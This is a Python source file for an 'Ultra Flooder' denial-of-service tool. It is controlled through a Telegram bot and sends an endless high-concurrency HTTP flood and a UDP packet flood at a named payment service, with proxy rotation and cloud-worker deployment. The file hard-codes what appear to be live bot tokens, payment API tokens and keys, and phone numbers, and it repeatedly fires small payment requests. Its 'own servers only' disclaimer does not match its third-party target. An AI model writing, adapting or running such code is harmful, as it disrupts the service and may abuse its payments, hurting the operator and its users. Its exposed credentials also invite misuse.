#!/usr/bin/env python3
"""
ULTRA FLOODER – HTTP + UDP with Telegram Bot
Deploy on Railway as a Worker.
Use ONLY on your own servers.
"""
import asyncio
import aiohttp
import random
import string
import time
import socket
import threading
import multiprocessing
import signal
import sys
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─── TELEGRAM CONFIG ──────────────────────────────────────
BOT_TOKEN = "8822885362:AAFqWv1vAniTnKwuSKI0FwO7mBIuBq3qOw8"
ADMIN_ID = 8401097557

# ─── ATTACK CONFIG ────────────────────────────────────────
TARGET_APIS = [
    "https://ultra-pay.in/APIs/api?token=03ImpEdccxeW52fJDa21P8PmeqO5JZ9ih5yOR92oDPHj&key=i8g5tb9OBczYhcAk8vgp&paytoNumber=9359202967&amount=1&comment={comment}",
    "https://ultra-pay.in/APIs/api?token=vlJEudnxirygr2lWDdRRVzNTlovGDOhHWi1Rs8LRoA&key=buTSXj38WxEW9T70y3&paytoNumber=6283146815&amount=1&comment={comment}"
]

# HTTP flood settings
HTTP_CONCURRENT = 1200          # adjust for speed
TOTAL_HTTP_REQUESTS = 0         # 0 = infinite
HTTP_DELAY = 0

# UDP flood settings
UDP_TARGET_HOST = "ultra-pay.in"
UDP_TARGET_PORT = 443
UDP_THREADS = 60
UDP_PACKET_SIZE = 1024
UDP_ENABLED = True

# Proxy support (optional)
USE_PROXIES = False
PROXY_FILE = "proxies.txt"

# ─── GLOBALS ──────────────────────────────────────────────────
stats = {'sent': 0, 'ok': 0, 'fail': 0, 'udp_sent': 0}
lock = asyncio.Lock()
start_time = time.time()
flooder_running = True
udp_running = True
loop = None
udp_process = None

def load_proxies():
    try:
        with open(PROXY_FILE) as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        return []

def random_comment(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def build_url(base):
    return base.format(comment=random_comment())

# ─── HTTP FLOOD ─────────────────────────────────────────────
async def fire(session, sem, url, proxy=None):
    global stats
    async with sem:
        try:
            async with session.get(url, proxy=proxy, ssl=False, timeout=5) as resp:
                status = resp.status
            async with lock:
                stats['sent'] += 1
                if 200 <= status < 400:
                    stats['ok'] += 1
                else:
                    stats['fail'] += 1
        except Exception:
            async with lock:
                stats['sent'] += 1
                stats['fail'] += 1

async def http_flooder():
    proxies = load_proxies() if USE_PROXIES else []
    sem = asyncio.Semaphore(HTTP_CONCURRENT)
    connector = aiohttp.TCPConnector(limit=HTTP_CONCURRENT * 2, limit_per_host=HTTP_CONCURRENT, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = set()
        count = 0
        while flooder_running and (TOTAL_HTTP_REQUESTS == 0 or count < TOTAL_HTTP_REQUESTS):
            for base in TARGET_APIS:
                if not flooder_running or (TOTAL_HTTP_REQUESTS != 0 and count >= TOTAL_HTTP_REQUESTS):
                    break
                url = build_url(base)
                proxy = random.choice(proxies) if proxies else None
                task = asyncio.create_task(fire(session, sem, url, proxy))
                tasks.add(task)
                count += 1
                if len(tasks) > HTTP_CONCURRENT * 2:
                    done, tasks = await asyncio.wait(tasks, timeout=0, return_when=asyncio.FIRST_COMPLETED)
                    tasks = set(tasks)
                await asyncio.sleep(0)
        if tasks:
            await asyncio.wait(tasks, timeout=5)

# ─── UDP FLOOD ──────────────────────────────────────────────
def udp_worker(ip, port, packet_size, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(packet_size)
    end = time.time() + duration if duration else float('inf')
    sent = 0
    while time.time() < end:
        try:
            sock.sendto(data, (ip, port))
            sent += 1
        except:
            pass
    return sent

def udp_flood_process(ip, port, threads, packet_size, duration=0):
    with threading.ThreadPoolExecutor(max_workers=threads) as pool:
        futures = [pool.submit(udp_worker, ip, port, packet_size, duration) for _ in range(threads)]
        total = sum(f.result() for f in futures)
    return total

def start_udp(ip, port, threads, packet_size):
    global udp_running
    while udp_running:
        udp_flood_process(ip, port, threads, packet_size, 10)  # flood in 10s chunks
    return

# ─── TELEGRAM COMMANDS ──────────────────────────────────────
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text("🔥 **Ultra Flooder** active.\n/status, /stop, /startflood, /udp")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    elapsed = time.time() - start_time
    rate = stats['sent'] / elapsed if elapsed > 0 else 0
    udp_rate = stats['udp_sent'] / elapsed if elapsed > 0 else 0
    msg = (f"📊 **Live Stats**\n"
           f"📤 HTTP Sent: {stats['sent']}\n"
           f"✅ OK: {stats['ok']}\n"
           f"❌ Errors: {stats['fail']}\n"
           f"📦 UDP Sent: {stats['udp_sent']}\n"
           f"⚡ HTTP Rate: {rate:.1f} req/s\n"
           f"⚡ UDP Rate: {udp_rate:.0f} pkt/s\n"
           f"⏱️ Uptime: {int(elapsed)}s\n"
           f"🔄 HTTP: {'Running' if flooder_running else 'Stopped'}\n"
           f"📡 UDP: {'Active' if udp_running else 'Off'}")
    await update.message.reply_text(msg)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooder_running, udp_running, udp_process
    if update.effective_user.id != ADMIN_ID:
        return
    flooder_running = False
    udp_running = False
    if udp_process and udp_process.is_alive():
        udp_process.terminate()
    await update.message.reply_text("🛑 All floods stopped.")

async def start_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooder_running, start_time, udp_running, udp_process
    if update.effective_user.id != ADMIN_ID:
        return
    if flooder_running:
        await update.message.reply_text("⚠️ HTTP already running.")
        return
    stats['sent'] = 0
    stats['ok'] = 0
    stats['fail'] = 0
    stats['udp_sent'] = 0
    start_time = time.time()
    flooder_running = True
    asyncio.create_task(http_flooder())
    if UDP_ENABLED and not udp_running:
        udp_running = True
        if udp_process and udp_process.is_alive():
            udp_process.terminate()
        udp_process = multiprocessing.Process(target=start_udp, args=(UDP_TARGET_HOST, UDP_TARGET_PORT, UDP_THREADS, UDP_PACKET_SIZE))
        udp_process.start()
    await update.message.reply_text("▶️ Flooder started (HTTP + UDP).")

async def udp_toggle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global udp_running, udp_process
    if update.effective_user.id != ADMIN_ID:
        return
    udp_running = not udp_running
    if udp_running:
        if udp_process and udp_process.is_alive():
            udp_process.terminate()
        udp_process = multiprocessing.Process(target=start_udp, args=(UDP_TARGET_HOST, UDP_TARGET_PORT, UDP_THREADS, UDP_PACKET_SIZE))
        udp_process.start()
        await update.message.reply_text("📡 UDP flood activated.")
    else:
        if udp_process and udp_process.is_alive():
            udp_process.terminate()
        await update.message.reply_text("📡 UDP flood deactivated.")

async def send_periodic_report(context: ContextTypes.DEFAULT_TYPE):
    if not flooder_running and not udp_running:
        return
    elapsed = time.time() - start_time
    rate = stats['sent'] / elapsed if elapsed > 0 else 0
    msg = (f"📊 **Auto Report**\n"
           f"📤 HTTP: {stats['sent']}\n"
           f"✅ OK: {stats['ok']}\n"
           f"❌ Errors: {stats['fail']}\n"
           f"📦 UDP: {stats['udp_sent']}\n"
           f"⚡ Rate: {rate:.1f} req/s")
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg)

# ─── MAIN ──────────────────────────────────────────────────
async def main():
    global loop, udp_process, flooder_running, udp_running
    loop = asyncio.get_running_loop()

    asyncio.create_task(http_flooder())

    if UDP_ENABLED:
        udp_running = True
        udp_process = multiprocessing.Process(target=start_udp, args=(UDP_TARGET_HOST, UDP_TARGET_PORT, UDP_THREADS, UDP_PACKET_SIZE))
        udp_process.start()

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("startflood", start_flooder))
    app.add_handler(CommandHandler("udp", udp_toggle))

    job_queue = app.job_queue
    if job_queue:
        job_queue.run_repeating(send_periodic_report, interval=30, first=10)

    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Ultra Flooder** is live!\n/status, /stop, /startflood, /udp")

    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    try:
        while True:
            await asyncio.sleep(60)
    except asyncio.CancelledError:
        pass
    finally:
        await app.updater.stop()
        await app.stop()

if __name__ == "__main__":
    def signal_handler(sig, frame):
        global flooder_running, udp_running, udp_process
        print("Shutting down...")
        flooder_running = False
        udp_running = False
        if udp_process and udp_process.is_alive():
            udp_process.terminate()
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Exiting.")
